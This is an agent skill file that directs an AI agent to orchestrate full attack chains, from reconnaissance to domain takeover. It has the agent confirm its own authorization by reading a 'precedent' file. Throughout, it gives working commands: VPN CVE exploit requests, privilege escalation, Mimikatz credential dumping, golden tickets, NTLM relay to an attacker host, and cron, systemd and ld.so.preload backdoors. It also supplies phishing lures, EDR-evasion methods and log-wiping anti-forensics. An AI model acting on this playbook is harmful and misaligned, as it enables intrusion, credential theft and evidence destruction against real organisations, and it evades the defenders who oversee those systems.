---
name: attack-chain
description: Use for authorized multi-stage attack-path planning and orchestration when a task spans reconnaissance, initial access, privilege escalation, lateral movement, or impact assessment. Route single-stage tasks directly to their specialist skill.
---
# Attack Chain Orchestration Skill

## ACTION REQUIRED (execute immediately after reading)

1. `NOW`: Read `../field-journal/precedent-pentest.md` — Confirm that the operation of this skill is an authorized normal operation
2. `NOW`: **Create/update case** (`../scripts/case-init.ps1`) and complete `scope.md` (`../ops/scope-contract.md`); `auth.status!=granted` disables ACT
3. `NOW`: In the **lead** role planning stage (`../ops/role-map.md`), write specialist_roles
4. `NEXT`: Read `../tool-index.md` to verify tool availability and actual path
5. `NEXT`: Call bootstrap when tools are missing, do not guess the path
6. `ACT`: Press `references/lifecycle-checklist.md` to pass the stage latch; update `timeline.md` + `workitems.md` (`../ops/timeline-workitem.md`) for each stage; discovery is promoted to Evidence/Finding
7. Ending: `docs-generator` reports must contain Evidence chain

> General commander of multi-stage attack path planning and execution. When the task requires a complete link "from A to B", this skill is responsible for orchestrating each stage, coordinating sub-skills, and planning the attack path.
> Not "red team only" - any penetration scenario that requires cross-stage combinations starts here.

---

## When to route to this Skill

The following scenarios **must** be planned through this Skill first, and then distributed to specific sub-Skills for execution:

| Scene | Why choreography is needed |
|------|--------------|
| "Do a complete penetration test for me" | Need to plan the entire process from information collection to reporting |
| "From the external network to domain control" | Breakthrough across borders → Elevate privileges → Horizontally → AD multiple stages |
| "HW Attack and Defense Drill" | Requires complete attack chain + concealment + trace cleaning |
| "Assess the attack surface of this target" | Requires multi-dimensional information collection + path planning |
| "I got a webshell, what should I do next?" | Need to plan the subsequent path from the current stronghold |
| "Help me plan the attack path" | Clearly need path orchestration |
| "To what extent can this vulnerability be exploited?" | The chain exploitation value of the vulnerability needs to be evaluated |
| "Bug Bounty Continuous Monitoring" | Need to automate multi-stage process |
| "The whole process of Internal-network pivoting" | Lateral movement + privilege escalation + domain attack combination |
| "Near-source penetration solution" | Physical access + Internal-network pivoting combination |
| "Supply Chain Attack Paths" | Cross-organizational multi-hop attacks |
| "Phishing + post-exploitation" | Initial access + subsequent exploitation combination |

**Single-stage tasks do not require this Skill**:
- Only do port scan → go directly to `pentest-tools/`
- Just do SQL injection → go directly to `pentest-tools/`
- Only do APK reverse → Go directly to `apk-reverse/`
- Only do domain penetration → Go directly to `windows-ad/SKILL.md`

---

## Arrangement principles

### The role of this Skill

```
User proposes multi-stage tasks
    ↓
attack-chain/SKILL.md (this file)
↓ Plan the attack path and determine the sequence of stages
↓ Evaluate the tools and methods required at each stage
    ↓
Distribute to specific sub-Skills for execution:
├── pentest-tools/ → Tool call, vulnerability exploitation
├── apk-reverse/ → Mobile penetration
├── js-reverse/ → Web front-end breakthrough
├── reverse-engineering/ → Binary Analysis
├── ida-reverse/ → Deep reverse
└── browser-automation/ → Automation operation
    ↓
After completing each stage, return to this skill to evaluate the next step.
    ↓
All completed → docs-generator generates report
```

### Path planning decision tree

```
After getting the target:
1. What is the goal? (Web/Intranet/Cloud/Mobile/IoT)
2. What's currently available? (External perspective/existing credentials/existing stronghold)
3. What is the ultimate goal? (Domain Control/Data/Specific System/Proof Impact)
4. Constraints? (Time/Concealment/Untouchable System)
    ↓
Plan the shortest path based on the above information
    ↓
One road leads nowhere → Return to this Skill to re-plan alternative paths
```

---

## Complete attack chain stage

---

## 1. Information collection stage (Reconnaissance)

### 1.1 Enterprise digital asset mapping

```bash
# Discovery of domain names associated with subsidiaries
subfinder -d target.com -o subdomains.txt
amass enum -d target.com -passive -o amass_results.txt

# Merge and remove duplicates
cat subdomains.txt amass_results.txt | sort -u > all_subs.txt

# Survival detection
httpx -l all_subs.txt -status-code -title -tech-detect -o alive.txt

# Port scan (full port)
naabu -l all_subs.txt -top-ports 1000 -o ports.txt
nmap -sV -sC -iL targets.txt -oA nmap_results
```

**Practical Points**:
- Obtain the list of subsidiaries through QiChacha/Tianyancha to expand the attack surface
- Pay attention to the test environment (test., dev., staging.) and new online systems
- Certificate Transparency log (crt.sh) found hidden domain name

### 1.2 Sensitive information leakage hunting

```bash
# GitHub Search
# org:Company filename:.env password
# org:Company filename:config.yml secret
# org:Company "jdbc:mysql" password

# Google Dork
# site:target.com filetype:sql
# site:target.com inurl:admin
# site:target.com ext:conf|cfg|ini

# API Key in JS file
cat js_urls.txt | while read url; do
  curl -s "$url" | grep -oP '(api[_-]?key|secret|token|password)\s*[:=]\s*["\047][^"\047]+'
done
```

**High Value Target**:
- Cloud services AK/SK (Alibaba Cloud, AWS, Azure)
- Database connection string
- JWT key
- Internal API documentation
-VPN/Bastion Host Credentials

### 1.3 Employee information portrait

**Social engineering dictionary generation rules**:
```
{Name Pinyin}{Year} → zhangsan2024
{Initials}{Department Abbreviations} → zs_dev
{employee number}@{domain name} → 10086@target.com
{Name}{Common suffix} → zhangsan@123, zhangsan!@#
```

**Information source**:
- Maimai/LinkedIn department structure
- Corporate public account/official website team introduction
- Recruitment information (technology stack exposed)
- Academic papers (email exposed)

### 1.4 Technology stack fingerprinting

```bash
# Web fingerprint
whatweb -i alive.txt --log-json=fingerprint.json
httpx -l alive.txt -tech-detect -json -o tech.json

# Frame specific detection
nuclei -l alive.txt -tags tech -severity info -o tech_results.txt

# CMS identification
wpscan --url https://target.com --enumerate p,t,u
```

---

## 2. Boundary breakthrough stage (Initial Access)

### 2.1 Web Vulnerability Exploitation (High Frequency Breaking Points)

| Vulnerability types | Detection tools | Exploitation methods |
|---------|---------|---------|
| SQL injection | sqlmap | data extraction → write shell → OS commands |
| SSTI | sstimap | template injection → RCE |
| File upload | Manual + Burp | Webshell → Rebound shell |
| Deserialization | ysoserial/marshalsec | Java/PHP/Python RCE |
| SSRF | Manual | Intranet detection → Cloud metadata → AK/SK |
| Unauthorized access | nuclei | Spring Actuator / Nacos / Redis |
| XSS → Cookie | xsstrike | Administrator session hijacking |

```bash
# SQL injection automation
sqlmap -u "https://target.com/api?id=1" --batch --dbs --random-agent

# SSTI test
sstimap -u "https://target.com/search?q=test"

# Nuclei batch scan
nuclei -l alive.txt -severity critical,high -tags cve,sqli,rce -o vulns.txt
```

### 2.2 Supply chain attack

**Attack Path**:
1. Identify third-party components/service providers used by the target
2. Attack the supplier to obtain code signing/update push permissions
3. Deliver malicious payloads through legitimate update channels

**Common entrance**:
- Poisoning open source components (npm/pip/maven)
- SaaS service provider API abuse
- Utilization of outsourced personnel’s permissions
- Horizontal penetration of shared IT service providers

### 2.3 Phishing attack

**Email Phishing**:
```
Theme template:
- [Urgent] The VPN certificate is about to expire, please update it immediately
- [IT Notice] Insufficient mailbox storage space, please clear it
- [HR] 2024 performance appraisal results query
- [Finance] Reimbursement system upgrade, please log in again to confirm
```

**Load Type**:
- Office macro documents (.docm/.xlsm)
- LNK shortcut (disguise PDF)
- HTML Smuggling
- ISO/IMG images (bypass MOTW)
- OneNote embedded script

**OAuth Phishing** (New Trend in 2025):
- Construct a malicious OAuth application to request permissions
- Obtain email/file access rights after user authorization
- No password required, bypass MFA

### 2.4 Near source penetration (Physical Access)

| Techniques | Tools | Effects |
|------|------|------|
| BadUSB | Rubber Ducky / WiFi Ducky | Keyboard Injection → Rebound Shell |
| Malicious power bank | O.MG Cable | Disguised data cable with backdoor implantation |
| WiFi Phishing | Fluxion / WiFi Pineapple | Fake Hotspot → Credential Capture |
| RFID Cloning | Proxmark3 | Access Card Copy → Physical Access |
| Network Implant | Raspberry Pi / LAN Turtle | Intranet Persistent Access Point |

```bash
# Fluxion WiFi Fishing
fluxion  # Interactively select target AP → Create fake hotspot → Capture WPA password

# BadUSB linkage Cobalt Strike
# Inject PowerShell Downloader via USB → Live C2
```

### 2.5 VPN/Remote Access Breakthrough

```bash
# Pulse Secure VPN（CVE-2019-11510）
curl -k "https://vpn.target.com/dana-na/../dana/html5acc/guacamole/../../../etc/passwd?/dana/html5acc/guacamole/"

# Fortinet VPN（CVE-2018-13379）
curl -k "https://vpn.target.com/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"

# General: Password spraying
hydra -L users.txt -P passwords.txt vpn.target.com https-form-post
```

### 2.6 Cloud service breakthrough

```bash
# AWS S3 bucket enumeration
aws s3 ls s3://target-bucket --no-sign-request

# Cloud Metadata SSRF
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Azure AD Password Spraying
# Using the MSOLSpray/Spray tool
```

---

## 3. Privilege Escalation

### 3.1 Windows privilege escalation

| Technology | Conditions | Tools |
|------|------|------|
| Potato Series | SeImpersonate Permissions | SweetPotato / GodPotato / PrintSpoofer |
| Kernel vulnerability | Unpatched | watson / wesng detection |
| Service path hijacking | Service path without quotes | PowerUp |
| DLL Hijacking | Writable DLL Search Path | Process Monitor |
| AlwaysInstallElevated | Registry configuration | msiexec installs malicious MSI |
| Scheduled tasks | Writable task scripts | schtasks replacement |

```powershell
# Detect SeImpersonate
whoami /priv | findstr "SeImpersonate"

# Potato privilege escalation
.\GodPotato.exe -cmd "cmd /c whoami"

# Automated detection
.\winPEAS.exe
```

### 3.2 Linux privilege escalation

```bash
# SUID detection
find / -perm -4000 -type f 2>/dev/null

# sudo abuse
sudo -l
# Commonly available: vim, find, python, nmap, less, awk, perl

# sudo vim privilege escalation
sudo vim -c ':!/bin/bash'

# sudo find privilege escalation
sudo find / -exec /bin/bash \;

# kernel vulnerability
uname -r  # Check version
# DirtyPipe (CVE-2022-0847), DirtyCow (CVE-2016-5195)

# Automated detection
./linpeas.sh
```

### 3.3 Database privilege escalation

```sql
-- MSSQL xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- MySQL UDF privilege escalation
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('id');

-- PostgreSQL
COPY (SELECT '') TO PROGRAM 'id';
```

### 3.4 Cloud Privilege Elevation

```bash
# AWS IAM enumeration
aws iam list-attached-user-policies --user-name compromised-user
# Look for iam:PassRole + lambda:CreateFunction → Administrator privileges

# Azure AD
# Global Admin → All Subscription Control
# Application Admin → Add Credentials to Service Principal
```

---

## 4. Lateral Movement Stage

### 4.1 Credential acquisition

```bash
# Mimikatz（Windows）
mimikatz# sekurlsa::logonpasswords
mimikatz# lsadump::dcsync /domain:target.local /user:krbtgt

# Linux credentials
cat /etc/shadow
cat ~/.bash_history | grep -i pass
find / -name "*.conf" -exec grep -l "password" {} \;

# NTLM Hash extraction
secretsdump.py domain/user:password@dc_ip
```

### 4.2 Pass-the-Hash / Pass-the-Ticket

```bash
# PTH horizontal
crackmapexec smb 10.0.0.0/24 -u administrator -H <NTLM_HASH> --exec-method smbexec

# Kerberoasting
GetUserSPNs.py -request -dc-ip 10.0.0.1 domain/user:password

# AS-REP Roasting
GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1

# gold note
mimikatz# kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-... /krbtgt:<HASH> /ptt
```

### 4.3 Covert horizontal technology

```bash
# WMI fileless execution
wmiexec.py domain/admin:password@target_ip "whoami"

# DCOM remote execution
dcomexec.py domain/admin:password@target_ip "whoami"

# WinRM
evil-winrm -i target_ip -u admin -H <NTLM_HASH>

# PsExec (will leave traces)
psexec.py domain/admin:password@target_ip

# SSH tunnel (Linux environment)
ssh -D 1080 user@pivot_host  # SOCKS proxy
ssh -L 3389:internal_host:3389 user@pivot_host  # port forwarding
```

### 4.4 NTLM Relay

```bash
# Turn off SMB/HTTP for Responder
# Edit Responder.conf: SMB = Off, HTTP = Off

# Start Responder capture
responder -I eth0

# NTLM Relay to target
ntlmrelayx.py -tf targets.txt -smb2support

# Coercer mandatory certification
coercer coerce -u user -p password -d domain -l attacker_ip -t dc_ip
```

### 4.5 AD attack path

```bash
# BloodHound data collection
bloodhound-python -d domain.local -u user -p password -c All -ns dc_ip

# Common attack paths:
# 1. User → GenericAll → Target User → Reset Password
# 2. User → WriteDacl → Target OU → Add permissions
# 3. Computer → Constrained Delegation → Impersonate any user
# 4. User → DCSync Permissions → Export All Hash

# Certipy AD CS attack
certipy find -u user@domain -p password -dc-ip dc_ip
certipy req -u user@domain -p password -ca CA-NAME -template VulnTemplate
```

---

## 5. Permission maintenance stage (Persistence)

### 5.1 Windows Persistence

| Technology | Concealment | Detection Difficulty |
|------|:---:|:---:|
| Scheduled tasks | Medium | Low |
| Registry Run Key | Low | Low |
| WMI Event Subscription | High | High |
| DLL Hijacking | High | Medium |
| Shadow Account | Medium | Medium |
| Golden Ticket | Extremely high | Extremely high |
| DSRM Backdoor | Extremely High | Extremely High |

```powershell
# WMI event subscription (high covertness)
$Filter = Set-WmiInstance -Class __EventFilter -Arguments @{
    Name = "CoreFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# shadow account
net user support$ P@ssw0rd /add /active:yes
net localgroup administrators support$ /add
# Modify registry F value and clone RID
```

### 5.2 Linux persistence

```bash
# SSH key implantation
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys

# Crontab backdoor
(crontab -l; echo "*/5 * * * * /tmp/.hidden/beacon") | crontab -

# LD_PRELOAD hijack
echo "/tmp/.hidden/evil.so" > /etc/ld.so.preload

# PAM backdoor
# Modify pam_unix.so to add a universal password

# Systemd services
cat > /etc/systemd/system/update.service << 'EOF'
[Unit]
Description=System Update Service
[Service]
ExecStart=/tmp/.hidden/beacon
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable update.service
```

### 5.3 Cloud environment persistence

```bash
# AWS Lambda backdoor
# Create a regularly triggered Lambda function and connect back to C2

# Azure AD app registration
# Create app → Add key credentials → Grant Graph API permissions

# Container backdoor
# Modify the base image → all new containers come with backdoors
```

---

## 6. EDR/AV bypass (Evasion)

### 6.1 Core bypass ideas

| Level | Technology | Description |
|------|------|------|
| Static detection | Encryption/obfuscation/custom loader | Avoid signature matching |
| Behavior Detection | Indirect System Call/Unhooking | Bypass API Hook |
| Memory detection | Module stomping/heap encryption | Avoiding memory scans |
| Network detection | Domain front/legitimate service tunnel | Mixing into normal traffic |
| Log detection | ETW Patching/Log clearing | Reduce traces |

### 6.2 Practical bypass techniques

```
1. Shellcode loader customization (no public tools required)
2. Direct system call (bypassing ntdll hook)
3. Process injection selects low-monitoring processes (such as RuntimeBroker.exe)
4. C2 traffic goes through HTTPS + domain fronting / Cloudflare Workers
5. Execute in memory without leaving disk (Fileless)
6. Loading with legitimate signatures (LOLBins)
```

### 6.3 C2 framework selection

| Framework | Features | Applicable scenarios |
|------|------|---------|
| Cobalt Strike | Mature and stable, teamwork | Large-scale red team operations |
| Sliver | Open source, written in Go | Limited budget |
| Havoc | Modern, modular | Customization required |
| Mythic | Multi-agent support | Cross-platform |
| AdaptixC2 | Kali 2026.1 included | Rapid deployment |

---

## 7. Trace Cleaning (Anti-Forensics)

```bash
# Windows log clearing
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Linux log clearing
echo > /var/log/auth.log
echo > /var/log/syslog
history -c && history -w

# Timestamp modification
touch -t 202301010000 /path/to/file

# Memory cleaning
# Make sure the Mimikatz dump is deleted
# Make sure the C2 beacon has exited
# Make sure temporary files are cleared
```

---

## The Iron Rules of Red Team Action

### Three bottom lines

1. **All operations must be authorized in writing**
2. **Data exfiltration requires anonymization**
3. **Clean up all attack traces (including memory resident)**

### Action Discipline

- Assess risk level (low/medium/high/severe) before each operation
- Notify project manager before high-risk operations
- Keep operation log (time, actions, results)
- Report high-risk vulnerabilities immediately and do not expand their use
- No impact on business availability (DoS prohibited)
- No access/download of real user data

### Typical failure cases

| Reasons for failure | Consequences | Lessons learned |
|---------|------|------|
| Mimikatz memory dump not cleared | Complete attack path traced by blue team | Clean up immediately after operation |
| C2 domain name flagged by threat intelligence | Blocked on first connection | Use newly registered domain name + domain prefix |
| Phishing emails trigger DLP alerts | Blue team early warning | Test email gateway rules |
| Lateral movement triggers honeypots | Reveals attack intent | Identify honeypots before acting |

---

## Tool Cheat Sheet

### Information collection
`subfinder` `amass` `httpx` `naabu` `katana` `gau` `dnsx` `nmap` `whatweb` `wpscan`

### Exploit
`nuclei` `sqlmap` `sstimap` `xsstrike` `burpsuite` `metasploit`

### Privilege Elevation
`winPEAS` `linpeas` `GodPotato` `PrintSpoofer` `watson`

### Lateral movement
`mimikatz` `crackmapexec/netexec` `impacket` `bloodhound` `certipy` `coercer` `responder` `evil-winrm`

### C2 Framework
`cobalt-strike` `sliver` `havoc` `mythic` `adaptixc2`

### Near source penetration
`fluxion` `aircrack-ng` `proxmark3` `rubber-ducky` `wifi-pineapple`

---

## Relationship with other Skills in this package

| Requirements | Route to |
|------|--------|
| Web Vulnerability Depth Exploitation | `pentest-tools/SKILL.md` |
| Detailed steps of intranet AD attack | `windows-ad/SKILL.md` |
| Reverse analysis of malicious samples | `reverse-engineering/SKILL.md` |
| APK reverse (mobile penetration) | `apk-reverse/SKILL.md` |
| JS front-end signature bypass | `js-reverse/SKILL.md` |
| Automated swarm penetration | Pentest Swarm AI (`pentestswarm scan --swarm`) |
| AI-assisted penetration | `mcp-kali-server` / `metasploitmcp` / `hexstrike-ai` |
| Report generation | `docs-generator/SKILL.md` |
| Attack path diagram | `diagram-generator/SKILL.md` |


## Task completion self-test (MUST pass before claiming completion)

- [ ] Did I execute every step in the workflow (instead of just reading)?
- [ ] Am I using real tool paths based on `tool-index`?
- [ ] Have I produced reproducible evidence (commands/scripts/screenshots/reports)?
- [ ] Have I completed and written back the Checklist items required by RULES?
